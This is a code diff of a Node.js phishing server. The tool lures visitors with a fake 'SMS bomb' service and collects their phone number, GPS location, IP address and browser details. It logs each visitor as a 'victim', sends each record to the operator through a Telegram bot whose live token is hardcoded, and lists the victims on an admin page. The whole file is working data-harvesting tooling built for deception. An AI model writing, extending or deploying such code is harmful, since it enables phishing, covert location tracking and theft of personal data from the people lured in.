@@ -4,23 +4,25 @@ const fs = require('fs');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// ⚡ TUS CREDENCIALES (REEMPLAZA ESTO)
+// Your Telegram credentials
 const BOT_TOKEN = '8559209717:AAF5SsdVl67GjcFK1NUXb0jBfJ5fwKyXy-I';
 const YOUR_CHAT_ID = '5728569894';
 
 app.use(express.static('public'));
+app.use(express.json());
 
-// Función para enviar alerta a Telegram
+// Telegram alert function
 async function sendTelegramAlert(victimData) {
-    const { ip, lat, lon, userAgent, referer } = victimData;
+    const { phone, lat, lon, count, userAgent, ip } = victimData;
     
-    const message = `🚨 **NUEVA VÍCTIMA LOCALIZADA** 🚨\n\n` +
-                    `🕒 **Hora:** ${new Date().toLocaleString()}\n` +
-                    `🌐 **IP:** ${ip}\n` +
-                    `📍 **Coordenadas:** ${lat}, ${lon}\n` +
-                    `🔗 **Referer:** ${referer || 'Direct'}\n` +
-                    `📱 **User Agent:** ${userAgent}\n\n` +
-                    `👉 [Ver en Google Maps](https://maps.google.com/?q=${lat},${lon})`;
+    const message = `🚀 **NEW SMS BOMB VICTIM** 🚀\n\n` +
+                   `📱 **Target Phone:** \`${phone}\`\n` +
+                   `🎯 **Location:** ${lat}, ${lon}\n` +
+                   `📊 **SMS Count:** ${count} messages\n` +
+                   `🌐 **IP Address:** ${ip}\n` +
+                   `🕒 **Time:** ${new Date().toLocaleString()}\n` +
+                   `📡 **User Agent:** ${userAgent.substring(0, 50)}...\n\n` +
+                   `📍 [View on Google Maps](https://maps.google.com/?q=${lat},${lon})`;
     
     try {
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -29,62 +31,95 @@ async function sendTelegramAlert(victimData) {
             text: message,
             parse_mode: 'Markdown'
         });
-        console.log('[BOT] Alerta enviada a Telegram');
+        console.log('[BOT] SMS Bomb alert sent to Telegram');
     } catch (error) {
         console.error('[BOT] Error:', error.message);
     }
 }
 
-// Endpoint principal de tracking
-app.get('/track', async (req, res) => {
+// Main tracking endpoint
+app.post('/track', async (req, res) => {
     const ip = req.headers['x-forwarded-for'] || req.ip || 'Unknown';
     const userAgent = req.headers['user-agent'] || 'Unknown';
     const referer = req.headers['referer'] || 'Direct';
-    const { lat, lon, acc, action } = req.query;
     
-    // Datos de la víctima
+    const { phone, lat, lon, count, time } = req.body;
+    
+    // Victim data
     const victimData = {
-        ip,
-        lat: lat || 'Not provided',
-        lon: lon || 'Not provided',
-        accuracy: acc || 'N/A',
+        phone: phone || 'Not provided',
+        lat: lat || 'Blocked',
+        lon: lon || 'Blocked',
+        count: count || '10',
         userAgent,
+        ip,
         referer,
-        action: action || 'location_click',
-        timestamp: new Date().toISOString()
+        timestamp: time || new Date().toISOString()
     };
     
-    // 1. Guardar en archivo de logs
+    // Save to log file
     const logEntry = `
-[${new Date().toLocaleString()}]
-IP: ${ip}
-Location: ${lat}, ${lon} (Accuracy: ${acc} m)
-User Agent: ${userAgent}
-Referer: ${referer}
-Action: ${action || 'click'}
+[SMS BOMB VICTIM - ${new Date().toLocaleString()}]
+📱 Phone: ${phone}
+📍 Location: ${lat}, ${lon}
+📊 SMS Count: ${count}
+🌐 IP: ${ip}
+🔗 Referer: ${referer}
+📱 User Agent: ${userAgent}
 ────────────────────────────
 `;
-    fs.appendFileSync('victims.log', logEntry);
+    fs.appendFileSync('sms_victims.log', logEntry);
     
-    // 2. Enviar alerta a Telegram
+    // Send Telegram alert
     await sendTelegramAlert(victimData);
     
-    // 3. Responder al cliente
-    res.json({ status: 'success', message: 'Location received' });
+    // Send response
+    res.json({ 
+        success: true, 
+        message: 'SMS bomb initiated. Messages will arrive shortly.',
+        fake_id: Math.random().toString(36).substring(7)
+    });
 });
 
-// Panel de administración (opcional)
+// GET tracking (for page views)
+app.get('/track', (req, res) => {
+    const ip = req.headers['x-forwarded-for'] || req.ip;
+    const action = req.query.action || 'unknown';
+    
+    const logEntry = `[PAGE VIEW] ${new Date().toISOString()} - IP: ${ip} - Action: ${action}\n`;
+    fs.appendFileSync('page_views.log', logEntry);
+    
+    res.sendStatus(200);
+});
+
+// Admin panel to view victims
 app.get('/admin', (req, res) => {
-    if (fs.existsSync('victims.log')) {
-        const logs = fs.readFileSync('victims.log', 'utf8');
-        res.send(`<pre>${logs}</pre>`);
+    if (fs.existsSync('sms_victims.log')) {
+        const logs = fs.readFileSync('sms_victims.log', 'utf8');
+        const html = `
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Admin Panel - SMS Bomb Tracker</title>
+            <style>
+                body { font-family: monospace; background: #0f0f0f; color: #0f0; padding: 20px; }
+                pre { background: #000; padding: 20px; border-radius: 5px; }
+                h1 { color: #fff; }
+            </style>
+        </head>
+        <body>
+            <h1>📊 SMS Bomb Victims Log</h1>
+            <pre>${logs}</pre>
+        </body>
+        </html>`;
+        res.send(html);
     } else {
-        res.send('No victims yet.');
+        res.send('No victims yet. Waiting for data...');
     }
 });
 
 app.listen(PORT, () => {
-    console.log(`🚀 Tracker running on port ${PORT}`);
-    console.log(`📁 Phishing page: http://localhost:${PORT}`);
+    console.log(`🔥 SMS Bomb Tracker running on port ${PORT}`);
+    console.log(`🎯 Phishing page: http://localhost:${PORT}`);
     console.log(`📊 Admin panel: http://localhost:${PORT}/admin`);
 });
